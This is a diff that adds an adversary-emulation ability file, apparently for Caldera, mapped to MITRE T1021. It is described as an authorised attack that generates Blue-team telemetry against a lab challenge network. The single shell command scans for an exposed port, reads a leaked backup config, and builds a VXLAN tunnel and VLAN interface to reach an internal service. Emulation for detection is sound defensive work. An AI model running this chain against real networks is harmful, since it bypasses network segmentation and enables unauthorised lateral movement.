@@ -1,0 +1,14 @@
+id: Network-Exposed-VXLAN-Bridge-Tagging-Error-Setup-Blue
+name: Network-Exposed-VXLAN-Bridge-Tagging-Error-Setup-Blue
+description: Runs the complete authorised attack inline for Blue telemetry.
+tactic: lateral-movement
+technique_id: T1021
+technique_name: Remote Services
+tag: Network
+executors:
+  - name: sh
+    platform: linux
+    command: >-
+      TARGET_ROUTE=$(ip -4 route show | awk '$1!="default" && $0 ~ /(wg|tun|tap)/ {print $1; exit}'); [ -n "$TARGET_ROUTE" ] || { echo "ERROR: No VPN challenge route found"; exit 1; }; TARGET_IP=$(sudo nmap -Pn -n -p8088 --open "$TARGET_ROUTE" -oG - 2>/dev/null | awk '/8088\/open/{print $2}' | while read -r ip; do curl -fsS --connect-timeout 2 "http://${ip}:8088/backup.conf" 2>/dev/null | grep -q 'ACCESS_PROFILE=user-edge' && { echo "$ip"; break; }; done); [ -n "$TARGET_IP" ] || { echo "ERROR: Challenge endpoint not discovered"; exit 1; }; BACKUP=$(curl -fsS "http://${TARGET_IP}:8088/backup.conf"); VXLAN_PORT=$(printf '%s\n' "$BACKUP" | awk -F= '/^VXLAN_PORT=/{print $2}'); VXLAN_VNI=$(printf '%s\n' "$BACKUP" | awk -F= '/^VXLAN_VNI=/{print $2}'); OUT_IF=$(ip route get "$TARGET_IP" | awk '{for(i=1;i<=NF;i++)if($i=="dev"){print $(i+1);exit}}'); sudo pkill -f 'dhclient.*vxlan200' 2>/dev/null || true; sudo ip link delete vxlan200.30 2>/dev/null || true; sudo ip link delete vxlan200 2>/dev/null || true; sudo ip link add vxlan200 type vxlan id "$VXLAN_VNI" remote "$TARGET_IP" dstport "$VXLAN_PORT" dev "$OUT_IF"; sudo ip link set vxlan200 up; sudo dhclient -1 -v vxlan200; sudo ip link add link vxlan200 name vxlan200.30 type vlan id 30; sudo ip link set vxlan200.30 up; sudo ip addr flush dev vxlan200.30; sudo ip addr add 10.20.30.50/24 dev vxlan200.30; curl --interface vxlan200.30 -fsS --connect-timeout 5 http://10.20.30.10:8080/
+    payloads: []
+    parsers: []
